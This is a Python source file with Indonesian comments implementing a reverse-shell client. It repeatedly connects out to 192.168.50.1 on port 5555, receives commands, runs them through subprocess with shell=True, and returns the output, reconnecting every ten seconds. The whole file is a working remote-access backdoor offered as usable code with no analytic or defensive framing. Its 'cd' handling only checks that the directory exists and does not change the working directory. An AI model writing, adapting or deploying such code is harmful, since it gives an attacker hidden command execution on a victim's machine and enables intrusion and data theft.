import socket
import time
import subprocess
import json
import sys # Import sys untuk keluar secara bersih

# Inisialisasi socket di luar fungsi agar mudah diakses
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# --- 1. Fungsi Bantuan untuk Jaringan (send dan receive) ---

def reliable_send(data):
    """Mengirim data (di-encode JSON) melalui koneksi socket."""
    jsondata = json.dumps(data)
    try:
        s.sendall(jsondata.encode())
    except socket.error:
        # Menangani jika koneksi terputus saat mengirim
        connection() # Coba sambungkan ulang

def reliable_recv():
    """Menerima dan mendekode data JSON secara andal."""
    data = ""
    while True:
        try:
            # Menerima chunk data dan mendekode
            data = data + s.recv(1024).decode()
            # Mencoba mengurai data sebagai JSON
            return json.loads(data)
        except ValueError:
            # Lanjut menerima jika data JSON belum utuh
            continue
        except socket.error:
            # Menangani jika koneksi terputus saat menerima
            connection() # Coba sambungkan ulang
            return None # Mengembalikan None agar loop shell bisa berlanjut

# --- 2. Fungsi Eksekusi Shell ---

def shell():
    """Loop utama untuk menerima perintah, mengeksekusi, dan mengirim hasil."""
    while True:
        command = reliable_recv()
        
        # Cek dan kirim perintah 'quit' ke server (untuk server tahu sesi berakhir)
        if command == "quit":
            reliable_send("Session terminated by target.")
            break
        
        # Menangani perintah CD (Change Directory)
        # Perintah CD harus ditangani oleh Python, BUKAN oleh subprocess, 
        # agar direktori kerja skrip tetap berubah.
        elif command.startswith("cd "):
            try:
                # Mengubah direktori kerja
                dir_path = command[3:].strip() # Ambil path setelah 'cd '
                subprocess.check_output(f"cd {dir_path}", shell=True) # Cek keberadaan dir (opsional)
                # Kirim feedback bahwa cd berhasil (meskipun cd tidak menghasilkan output)
                reliable_send(f"[+] Changed directory to {dir_path}")
            except Exception as e:
                reliable_send(f"[-] Error changing directory: {e}")
            
        else:
            # Eksekusi perintah lain menggunakan subprocess
            # Menambahkan stderr dan stdin untuk keandalan. Timeout untuk mencegah hanging.
            try:
                execute = subprocess.run(
                    command, 
                    shell=True, 
                    capture_output=True,
                    timeout=15, # Batas waktu eksekusi
                    text=True    # Menggunakan mode teks untuk output
                )
                
                # Menggabungkan stdout dan stderr untuk hasil yang lengkap
                result = execute.stdout + execute.stderr
                reliable_send(result.strip() if result else "[+] Command executed successfully (no output).")
                
            except Exception as e:
                reliable_send(f"[-] Execution Error: {e}")

# --- 3. Fungsi Penanganan Koneksi ---

def connection():
    """Mencoba menyambungkan kembali ke server secara berkala."""
    global s # Menggunakan objek socket global
    while True:
        time.sleep(10) # Jeda 10 detik sebelum mencoba lagi
        try:
             # Coba sambungkan
             s.connect(("192.168.50.1", 5555))
             print("[+] Connected to server.")
             shell() # Jika berhasil, masuk ke mode shell
             # Jika shell() selesai (karena perintah 'quit'), tutup socket
             s.close()
             # Lanjut ke baris selanjutnya, yaitu break (tidak ada break di sini, tapi di main loop)
             break 
        except socket.error:
            # Jika koneksi gagal, lanjutkan loop (coba lagi setelah sleep)
            sys.stdout.write("[!] Connection failed, retrying in 10s...\r")
            sys.stdout.flush()

# --- Program Utama ---
connection()


